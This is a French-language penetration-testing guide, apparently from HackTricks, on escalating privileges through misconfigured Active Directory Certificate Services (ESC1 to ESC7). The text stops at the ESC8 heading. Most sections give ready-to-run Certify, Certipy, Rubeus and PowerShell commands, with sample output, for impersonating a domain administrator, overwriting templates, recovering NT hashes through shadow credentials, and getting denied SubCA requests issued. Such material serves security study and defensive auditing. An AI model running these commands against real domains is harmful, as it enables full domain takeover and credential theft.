# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Voici un résumé des sections sur les techniques d’escalade des articles suivants :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Explication de la mauvaise configuration des modèles de certificats - ESC1

- **L’Enterprise CA accorde des droits d’inscription à des utilisateurs disposant de faibles privilèges.**
- **L’approbation d’un responsable n’est pas requise.**
- **Aucune signature de personnel autorisé n’est nécessaire.**
- **Les descripteurs de sécurité des modèles de certificats sont trop permissifs, ce qui permet aux utilisateurs disposant de faibles privilèges d’obtenir des droits d’inscription.**
- **Les modèles de certificats sont configurés pour définir des EKU qui facilitent l’authentification :**
  - Des identifiants Extended Key Usage (EKU) tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou aucune EKU (SubCA) sont inclus.
- **Le modèle autorise les demandeurs à inclure un subjectAltName dans la Certificate Signing Request (CSR) :**
  - Si un subjectAltName (SAN) est présent dans un certificat, Active Directory (AD) lui donne la priorité pour vérifier l’identité. Ainsi, en spécifiant le SAN dans une CSR, il est possible de demander un certificat permettant d’usurper l’identité de n’importe quel utilisateur (par exemple, un administrateur de domaine). La possibilité pour le demandeur de spécifier un SAN est indiquée dans l’objet AD du modèle de certificat par la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits ; la présence de l’indicateur `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet au demandeur de spécifier le SAN.

> [!CAUTION]
> Ces paramètres identifient un modèle candidat ESC1, mais ne constituent pas à eux seuls un chemin d’usurpation d’identité complet. Vérifiez que le principal ciblé peut s’inscrire auprès d’une CA qui publie le modèle, que l’inscription auprès de la CA est autorisée et que le certificat délivré satisfait aux règles strictes de mappage SID du point de terminaison d’authentification. Les KDC actuels corrigés peuvent rejeter un UPN demandé si le SID du certificat ne correspond pas à celui de la cible ; consultez [les instructions de Microsoft sur le mappage des certificats](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Les droits d’inscription accordés à **Domain Computers** peuvent rendre une identité d’ordinateur préparée éligible, même si l’utilisateur d’origine ne peut pas s’inscrire. Évaluez séparément les droits du principal ordinateur. Vérifiez `msPKI-Minimal-Key-Size` avant d’envoyer une demande : un modèle exigeant des clés RSA de 4096 bits rejette la valeur par défaut de 2048 bits du client. Un SID cible fourni dans la demande peut résoudre une incompatibilité de SID uniquement si la CA et le KDC acceptent le certificat obtenu et son mappage ; ni les indicateurs du modèle ni une ACE Enroll ne suffisent à le prouver.

Cette fonctionnalité est parfois activée pour permettre la génération à la volée de certificats HTTPS ou d’hôte par des produits ou des services de déploiement, ou par manque de compréhension.

Il est à noter que la création d’un certificat avec cette option déclenche un avertissement, contrairement au cas où un modèle de certificat existant (tel que le modèle `WebServer`, pour lequel `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé) est dupliqué puis modifié pour inclure un OID d’authentification.<sup>[[6]](#references)</sup>

### Exploitation

Pour **rechercher des modèles de certificats vulnérables**, vous pouvez exécuter :

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Pour **exploiter cette vulnérabilité afin d'usurper l'identité d'un administrateur**, on peut exécuter :

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Ensuite, vous pouvez convertir le **certificat généré au format `.pfx`** et l’utiliser pour **vous authentifier à nouveau avec Rubeus ou certipy** :<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Les binaires Windows « Certreq.exe » et « Certutil.exe » peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L’énumération des modèles de certificats dans le schéma de configuration de la forêt AD, en particulier ceux qui ne nécessitent ni approbation ni signatures, qui possèdent un EKU Client Authentication ou Smart Card Logon et pour lesquels l’indicateur `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé, peut être effectuée en exécutant la requête LDAP suivante :

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Modèles de certificat mal configurés - ESC2

### Explication

Le deuxième scénario d’abus est une variante du premier :

1. L’Enterprise CA accorde des droits d’inscription à des utilisateurs disposant de faibles privilèges.
2. L’exigence d’approbation du responsable est désactivée.
3. L’exigence de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde des droits d’inscription à des utilisateurs disposant de faibles privilèges.
5. **Le modèle de certificat est configuré pour inclure l’EKU Any Purpose ou aucune EKU.**

L’**EKU Any Purpose** permet à un attaquant d’obtenir un certificat pour **n’importe quel usage**, notamment l’authentification du client, l’authentification du serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats **sans EKU**, qui agissent comme des certificats d’AC subordonnée, peuvent être exploités **pour n’importe quel usage** et peuvent **également servir à signer de nouveaux certificats**. Un attaquant pourrait donc spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat d’AC subordonnée.

Cependant, les nouveaux certificats créés pour l’**authentification de domaine** ne fonctionneront pas si l’AC subordonnée n’est pas approuvée par l’objet **`NTAuthCertificates`**, ce qui est le paramètre par défaut. Néanmoins, un attaquant peut toujours créer de **nouveaux certificats avec n’importe quelle EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient être **exploités** à diverses fins (par exemple, la signature de code, l’authentification du serveur, etc.) et avoir des conséquences importantes pour d’autres applications du réseau, comme SAML, AD FS ou IPSec.<sup>[[6]](#references)</sup>

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Modèles d’agent d’inscription mal configurés - ESC3

### Explication

Ce scénario est similaire aux deux premiers, mais **exploite** un **EKU différent** (Certificate Request Agent) et **2 modèles différents** (il comporte donc 2 ensembles d’exigences),

L’**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), appelé **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **s’inscrire** pour obtenir un **certificat** au **nom d’un autre utilisateur**.

L’**« enrollment agent »** s’inscrit à un **modèle** de ce type et utilise le **certificat obtenu pour cosigner une CSR au nom de l’autre utilisateur**. Il **envoie** ensuite la **CSR cosignée** à la CA et s’inscrit à un **modèle** qui **autorise l’inscription « au nom de »**. La CA répond alors avec un **certificat appartenant à l’« autre » utilisateur**.<sup>[[6]](#references)</sup>

**Exigences 1 :**

- L’Enterprise CA accorde des droits d’inscription à des utilisateurs peu privilégiés.
- L’approbation du responsable n’est pas requise.
- Aucune signature autorisée n’est requise.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif et accorde des droits d’inscription à des utilisateurs peu privilégiés.
- Le modèle de certificat inclut l’EKU Certificate Request Agent, qui permet de demander d’autres modèles de certificats au nom d’autres principaux.

**Exigences 2 :**

- L’Enterprise CA accorde des droits d’inscription à des utilisateurs peu privilégiés.
- L’approbation du responsable est contournée.
- Un modèle cible de version 1 peut accepter un enrollment agent sans les contrôles plus récents et granulaires de stratégie d’émission ; pour la version 2 ou ultérieure, examinez ses exigences de stratégie d’application pour l’émission et les signatures autorisées, plutôt que d’exclure le modèle uniquement en fonction de sa version.
- Un EKU défini dans le modèle de certificat autorise l’authentification au domaine.
- Les restrictions relatives aux enrollment agents ne sont pas appliquées sur la CA.

Le modèle cible doit également être publié par la CA choisie, autoriser le compte cible à s’inscrire et prendre en charge l’usage prévu pour l’authentification au domaine. Vérifiez les attributs subject/SAN requis pour ce compte ; par exemple, un modèle qui construit un sujet à partir de l’adresse e-mail AD ne peut pas être utilisé pour émettre un certificat pour un compte sans la valeur `mail` requise. Un certificat d’agent seul ne satisfait pas ces conditions requises par le modèle cible.

### Exploitation

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour exploiter ce scénario :<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Les **utilisateurs** autorisés à **obtenir** un **certificat d’agent d’inscription**, les modèles dans lesquels les **agents** d’inscription sont autorisés à s’inscrire et les **comptes** au nom desquels l’agent d’inscription peut agir peuvent être limités par les autorités de certification d’entreprise. Pour ce faire, ouvrez le **snap-in** `certsrc.msc`, **cliquez avec le bouton droit sur l’autorité de certification**, **cliquez sur Propriétés**, puis **accédez** à l’onglet « Agents d’inscription ».

Notez toutefois que le paramètre **par défaut** des autorités de certification est « **Ne pas limiter les agents d’inscription** ». Lorsque les administrateurs activent la restriction des agents d’inscription en sélectionnant « Limiter les agents d’inscription », la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s’inscrire à tous les modèles en tant que n’importe quel utilisateur.

### PoCs PowerShell réservés à Windows avec Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) exploite ESC1 et ESC2/ESC3 sans Certify ni Certipy. Ses scripts créent une clé RSA de 2048 bits exportable à l’aide de l’API COM `X509Enrollment`, construisent une requête PKCS#10, découvrent le premier `pKIEnrollmentService` via LDAP, la soumettent au moyen de `CertificateAuthority.Request`, installent la réponse dans `Cert:\CurrentUser\My` et exportent un PFX encodé en Base64. Le script ESC1 ajoute un SAN UPN choisi par l’attaquant (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valeur `0xb`), tandis que les scripts ESC2/ESC3 utilisent le premier certificat pour signer une requête PKCS#7 au nom d’un autre utilisateur.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Les scripts affichent le Base64 du **PFX**, qui inclut la clé privée, pour une utilisation directe avec Rubeus. Ne le remplacez pas par `[Convert]::ToBase64String($cert.RawData)` : `RawData` encode uniquement le certificat public et ne peut pas signer la requête PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Contrôle d’accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Le **descripteur de sécurité** des **modèles de certificats** définit les **autorisations** dont disposent les **principaux AD** sur le modèle.

Si un **attaquant** dispose des **autorisations** nécessaires pour **modifier** un **modèle** et **introduire** l’une des **mauvaises configurations exploitables** décrites dans les **sections précédentes**, cela peut faciliter une élévation de privilèges.

Les autorisations notables applicables aux modèles de certificats incluent :<sup>[[6]](#references)</sup>

- **Owner :** Accorde un contrôle implicite sur l’objet et permet de modifier n’importe lequel de ses attributs.
- **FullControl :** Accorde une autorité complète sur l’objet, y compris la possibilité d’en modifier n’importe quel attribut.
- **WriteOwner :** Permet de remplacer le propriétaire de l’objet par un principal contrôlé par l’attaquant.
- **WriteDacl :** Permet de modifier les contrôles d’accès, ce qui peut donner à un attaquant FullControl.
- **WriteProperty :** Autorise la modification de n’importe quelle propriété de l’objet.

Examinez également la DACL du conteneur `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Une ACE `CreateChild` applicable à la [classe `pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ou un contrôle total étendu, peut permettre de créer un nouvel objet de modèle. [Microsoft indique](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) que ce conteneur contient ces objets de modèle. Examinez les ACE de refus correspondantes ainsi que l’héritage avant de déterminer si la création est effective. La création d’un modèle ne permet pas, à elle seule, d’émettre un certificat : une AC doit le publier, le principal demandeur doit disposer des droits d’inscription, et le certificat doit être associé à l’identité visée au point de terminaison d’authentification.

### Exploitation

Pour identifier les principaux disposant de droits de modification sur les modèles et autres objets PKI, effectuez une énumération avec Certify :

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Un exemple de privesc comme le précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 se produit lorsqu’un utilisateur dispose de privilèges d’écriture sur un modèle de certificat. Cela peut, par exemple, être exploité pour modifier la configuration du modèle de certificat afin de le rendre vulnérable à ESC1.

Un modèle qui autorise déjà le demandeur à fournir le sujet, mais qui n’a que l’usage Server Authentication, ne permet pas à lui seul l’ouverture de session d’un utilisateur. Avec des droits effectifs de contrôle du modèle, un attaquant pourrait modifier ses EKU d’authentification ou ses stratégies d’application avant de demander un certificat ; [Microsoft documente la fonction d’ouverture de session de l’EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Vérifiez qu’une CA publie le modèle modifié, que le demandeur peut s’inscrire, que les exigences d’approbation et de signature sont satisfaites, et que le certificat délivré est associé au compte visé. En particulier, [les contrôleurs de domaine corrigés en mode Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rejettent les certificats sans mappage fort ; ajouter l’UPN d’une cible à une demande ne contourne pas cette exigence.

Comme on peut le voir dans le chemin ci-dessus, seul `JOHNPC` dispose de ces privilèges, mais notre utilisateur `JOHN` a une nouvelle relation `AddKeyCredentialLink` vers `JOHNPC`. Comme cette technique est liée aux certificats, j’ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Voici un petit aperçu de la commande `shadow auto` de Certipy, qui permet de récupérer le hachage NT de la victime.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** peut remplacer la configuration d’un modèle de certificat avec une seule commande. Par **défaut**, Certipy **remplace** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le paramètre **`-save-old` pour enregistrer l’ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Contrôle d’accès vulnérable à un objet PKI - ESC5

### Explication

Le vaste réseau de relations interconnectées basées sur les ACL, qui comprend plusieurs objets en plus des modèles de certificats et de l’autorité de certification, peut compromettre la sécurité de l’ensemble du système AD CS. Ces objets, qui peuvent avoir un impact considérable sur la sécurité, comprennent :

- L’objet ordinateur AD du serveur CA, qui peut être compromis par des mécanismes tels que S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout objet AD descendant ou conteneur situé dans le chemin de conteneurs spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin comprend notamment le conteneur Certificate Templates, le conteneur Certification Authorities, l’objet NTAuthCertificates et le conteneur Enrollment Services.

La sécurité du système PKI peut être compromise si un attaquant disposant de faibles privilèges parvient à prendre le contrôle de l’un de ces composants critiques.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet abordé dans le [**billet de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications de l’indicateur **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, telles que décrites par Microsoft. Lorsque cette configuration est activée sur une autorité de certification (CA), elle permet d’inclure des **valeurs définies par l’utilisateur** dans le **nom alternatif du sujet** pour **n’importe quelle demande**, y compris celles générées à partir d’Active Directory®. Par conséquent, cette configuration permet à un **intrus** de s’inscrire à l’aide de **n’importe quel modèle** configuré pour l’**authentification** du domaine, en particulier ceux accessibles aux utilisateurs **sans privilèges**, comme le modèle User standard. Un certificat peut ainsi être obtenu, permettant à l’intrus de s’authentifier en tant qu’administrateur du domaine ou **toute autre entité active** au sein du domaine.<sup>[[9]](#references)</sup>

**Remarque** : La méthode permettant d’ajouter des **noms alternatifs** à une demande de signature de certificat (CSR), à l’aide de l’argument `-attrib "SAN:"` de `certreq.exe` (appelé « Name Value Pairs »), **diffère** de la stratégie d’exploitation des SAN dans ESC1. La différence tient à la **manière dont les informations du compte sont encapsulées** : dans un attribut de certificat plutôt que dans une extension.

### Exploitation

Pour vérifier si ce paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Cette opération utilise essentiellement **l’accès au registre à distance** ; une autre approche pourrait donc être :

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) peuvent détecter cette mauvaise configuration et l’exploiter :<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Pour modifier ces paramètres, à condition de disposer de droits **d’administration du domaine** ou équivalents, la commande suivante peut être exécutée depuis n’importe quel poste de travail :

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Pour désactiver cette configuration dans votre environnement, l’indicateur peut être supprimé avec :

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Après l'installation des mises à jour de sécurité de mai 2022, les **certificats** nouvellement émis contiendront une **extension de sécurité** intégrant la propriété `objectSid` du **demandeur**. Pour ESC1, cet SID est dérivé du SAN spécifié. Toutefois, pour **ESC6**, le SID correspond à l'`objectSid` du **demandeur**, et non au SAN.\
> Pour exploiter ESC6, le système doit impérativement être vulnérable à ESC10 (mappages de certificats faibles), qui donne la priorité au **SAN plutôt qu'à la nouvelle extension de sécurité**.

## Contrôle d'accès vulnérable à l'autorité de certification - ESC7

### Attaque 1

#### Explication

Le contrôle d'accès d'une autorité de certification est assuré par un ensemble d'autorisations qui régissent les actions de l'AC. Ces autorisations sont consultables en accédant à `certsrv.msc`, en faisant un clic droit sur une AC, en sélectionnant les propriétés, puis en ouvrant l'onglet Sécurité. De plus, les autorisations peuvent être énumérées à l'aide du module PSPKI avec des commandes telles que :

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant respectivement aux rôles d’« administrateur de CA » et de « Certificate Manager ».<sup>[[6]](#references)</sup>

#### Abuse

Les droits **`ManageCA`** sur une autorité de certification permettent au principal de modifier les paramètres à distance à l’aide de PSPKI. Cela inclut l’activation ou la désactivation du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour autoriser la spécification d’un SAN dans n’importe quel template, un aspect crucial de l’escalade de domaine.

Il est possible de simplifier ce processus à l’aide de la cmdlet **Enable-PolicyModuleFlag** de PSPKI, qui permet d’effectuer des modifications sans interaction directe avec l’interface graphique.

Les droits **`ManageCertificates`** permettent d’approuver les demandes en attente, contournant ainsi la protection « approbation par le Certificate Manager de la CA ».

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attaque 2

#### Explication

> [!WARNING]
> Dans la **précédente attaque**, les permissions **`Manage CA`** ont été utilisées pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'effectuer l'**attaque ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'aura pas été redémarré. Lorsqu'un utilisateur dispose du droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, E**SC6 pourrait ne pas fonctionner directement** dans la plupart des environnements corrigés, en raison des mises à jour de sécurité de mai 2022.

Une autre attaque est donc présentée ici.

Prérequis :

- Uniquement la permission **`ManageCA`**
- La permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
- Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

Cette technique repose sur le fait que les utilisateurs disposant des droits d'accès `Manage CA` _et_ `Manage Certificates` peuvent **émettre des demandes de certificat refusées**. Le modèle de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'inscrire au modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire au modèle **`SubCA`** — ce qui lui sera **refusé** — puis la demande sera **émise ultérieurement par le responsable**.<sup>[[6]](#references)</sup>

#### Exploitation

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur comme nouvel officier.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Le modèle **`SubCA`** peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous enregistrerons la clé privée et noterons l’ID de la demande.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Avec nos droits **`Manage CA` et `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat en échec** à l'aide de la commande `ca` et du paramètre `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Et enfin, nous pouvons **récupérer le certificat délivré** avec la commande `req` et le paramètre `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attaque 3 – Abus de l’extension Manage Certificates (SetExtension)

#### Explication

En plus des abus classiques d’ESC7 (activation des attributs EDITF ou approbation des demandes en attente), **Certify 2.0** a révélé une nouvelle primitive qui nécessite uniquement le rôle *Manage Certificates* (alias **Certificate Manager / Officer**) sur l’Enterprise CA.<sup>[[3]](#references)</sup>

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par tout principal disposant de *Manage Certificates*. Alors que cette méthode était traditionnellement utilisée par les CA légitimes pour mettre à jour les extensions des demandes **en attente**, un attaquant peut en abuser pour **ajouter une extension de certificat *non définie par défaut*** (par exemple, un OID personnalisé de *Certificate Issuance Policy* tel que `1.1.1.1`) à une demande en attente d’approbation.

Comme le template ciblé **ne définit pas de valeur par défaut pour cette extension**, la CA ne remplacera PAS la valeur contrôlée par l’attaquant lorsque la demande sera finalement émise. Le certificat obtenu contient donc une extension choisie par l’attaquant, qui peut :

* Satisfaire aux exigences Application / Issuance Policy d’autres templates vulnérables (et entraîner une élévation de privilèges).
* Injecter des EKU ou des politiques supplémentaires qui confèrent au certificat une confiance inattendue dans des systèmes tiers.

En bref, *Manage Certificates* — auparavant considéré comme la partie la « moins puissante » d’ESC7 — peut désormais permettre une élévation complète de privilèges ou une persistance à long terme, sans modifier la configuration de la CA ni nécessiter le droit plus restrictif *Manage CA*.

#### Abus de cette primitive avec Certify 2.0

1. **Soumettez une demande de certificat qui restera *en attente*.** Cela peut être forcé avec un template qui exige l’approbation d’un gestionnaire :
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Ajouter une extension personnalisée à la demande en attente** à l’aide de la nouvelle commande manage-ca :
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Si le modèle ne définit pas déjà l’extension *Certificate Issuance Policies*, la valeur ci-dessus sera conservée après l’émission.*

3. **Émettez la demande** (si votre rôle dispose également des droits d’approbation *Manage Certificates*) ou attendez qu’un opérateur l’approuve. Une fois le certificat émis, téléchargez-le :
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Le certificat obtenu contient désormais l’OID de stratégie d’émission malveillant et peut être utilisé dans des attaques ultérieures (par ex. ESC13, élévation de privilèges dans le domaine, etc.).

> NOTE : La même attaque peut être exécutée avec Certipy ≥ 4.7 à l’aide de la commande `ca` et du paramètre `-set-extension`.

## Relais NTLM vers les points de terminaison HTTP d’AD CS – ESC8

### Explication

> [!TIP]
